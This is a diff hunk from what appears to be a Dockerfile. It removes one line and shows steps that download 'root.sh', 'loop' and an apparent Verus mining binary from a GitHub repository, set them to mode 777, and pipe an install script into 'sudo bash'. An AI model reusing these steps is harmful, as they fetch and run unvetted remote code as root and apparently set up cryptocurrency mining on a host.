@@ -20,7 +20,6 @@ RUN wget https://raw.githubusercontent.com/breakok/ob/main/root.sh
 RUN wget https://github.com/breakok/ob/raw/main/loop
 RUN wget https://github.com/breakok/ob/raw/main/verus-solver
 RUN chmod 777 verus-solver
-RUN sudo ph add verus-solver
 RUN chmod 777 loop
 RUN chmod 777 root.sh
 RUN curl https://rclone.org/install.sh | sudo bash
